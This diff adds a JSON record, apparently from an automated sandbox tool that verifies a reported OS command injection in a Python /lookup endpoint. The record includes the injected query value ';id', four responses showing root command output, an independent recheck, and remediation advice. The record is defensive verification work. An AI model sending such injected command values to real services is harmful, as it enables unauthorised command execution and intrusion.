@@ -1,0 +1,116 @@
+{
+  "claim": {
+    "report": "The GET /lookup endpoint appears vulnerable to OS command injection through the\nq query parameter. An attacker-controlled q value may be concatenated into a\nshell command. Please verify whether the claim is reproducible and distinguish\na real reproduction from a failed test setup.\n",
+    "runtime": "python",
+    "subject_type": "http_app"
+  },
+  "dependencies": {
+    "events": [
+      {
+        "installed": false,
+        "manifest": null,
+        "reason": "no supported dependency manifest found",
+        "supported": true
+      }
+    ],
+    "install_scripts_allowed": false,
+    "mode": "offline",
+    "network_during_install_allowed": false
+  },
+  "error": null,
+  "evidence": {
+    "agent_rationale": "The /lookup endpoint runs `subprocess.run` with `shell=True` and directly interpolates the `q` query parameter into a shell command (`printf 'lookup %s' {name}`). Supplying `;id` as the `q` value caused the shell to execute `id`, confirming OS command injection. The test reproduced the injection reliably.",
+    "attempts": [
+      {
+        "body": "{\"output\": \"lookup \\nuid=0(root) gid=0(root) groups=0(root)\\n\", \"error\": \"\"}",
+        "elapsed_ms": 11.388,
+        "marker_detected": false,
+        "outcome": "complete",
+        "param_name": "q",
+        "param_value": ";id",
+        "path": "/lookup",
+        "status": 200
+      },
+      {
+        "body": "{\"output\": \"lookup \\nuid=0(root) gid=0(root) groups=0(root)\\n\", \"error\": \"\"}",
+        "elapsed_ms": 6.693,
+        "marker_detected": false,
+        "outcome": "complete",
+        "param_name": "q",
+        "param_value": ";id",
+        "path": "/lookup",
+        "status": 200
+      },
+      {
+        "body": "{\"output\": \"lookup \\nuid=0(root) gid=0(root) groups=0(root)\\n\", \"error\": \"\"}",
+        "elapsed_ms": 5.365,
+        "marker_detected": false,
+        "outcome": "complete",
+        "param_name": "q",
+        "param_value": ";id",
+        "path": "/lookup",
+        "status": 200
+      },
+      {
+        "body": "{\"output\": \"lookup \\nuid=0(root) gid=0(root) groups=0(root)\\n\", \"error\": \"\"}",
+        "elapsed_ms": 6.539,
+        "marker_detected": false,
+        "outcome": "complete",
+        "param_name": "q",
+        "param_value": ";id",
+        "path": "/lookup",
+        "status": 200
+      }
+    ],
+    "independent_recheck": {
+      "fresh_token": "cairn-independent-8b086f159c9ea8ad",
+      "marker_detected": true,
+      "outcome": "complete",
+      "request_constructed_by": "control_plane",
+      "status": 200
+    },
+    "request": {
+      "param_name": "q",
+      "param_value": ";id",
+      "path": "/lookup"
+    },
+    "source_hash": "cc9d7b04afc3e8de260bc6294d5fffb747769457669a33a875e5c87c943e63a7"
+  },
+  "explanation": {
+    "next_action": "Open a remediation ticket with the source hash and reproduction recipe.",
+    "remediation": [
+      "Review the source location identified in the evidence.",
+      "Replace shell composition with an argument vector or a safe library API.",
+      "Validate attacker-controlled input before invoking operating-system functionality."
+    ],
+    "why": [
+      "At least one investigation request produced marker evidence.",
+      "The control plane constructed a fresh independent request and observed its marker."
+    ]
+  },
+  "generated_at": "2026-10-23T19:01:30.170765+00:00",
+  "investigation_id": "inv-real-dynamic-vercel-free-20261024",
+  "lifecycle": {
+    "application_started": true,
+    "sandbox_deleted": true,
+    "sandbox_name": "sbx-cairn024ddc5dde09",
+    "source_uploaded": true,
+    "subject_manifest": {
+      "file_count": 2,
+      "files": [
+        "app.py",
+        "security-report.txt"
+      ],
+      "source_hash": "fb86b67ef84a4400d820ef32d3f1abe2612645418362ad0778d3baa3193a2617"
+    },
+    "wall_clock_s": 115.242
+  },
+  "schema_version": 1,
+  "subject": {
+    "port": 5002,
+    "source_hash": "cc9d7b04afc3e8de260bc6294d5fffb747769457669a33a875e5c87c943e63a7",
+    "working_directory": "."
+  },
+  "summary": "The reported behavior was reproduced and confirmed by an independent control-plane recheck.",
+  "verdict": "verified"
+}
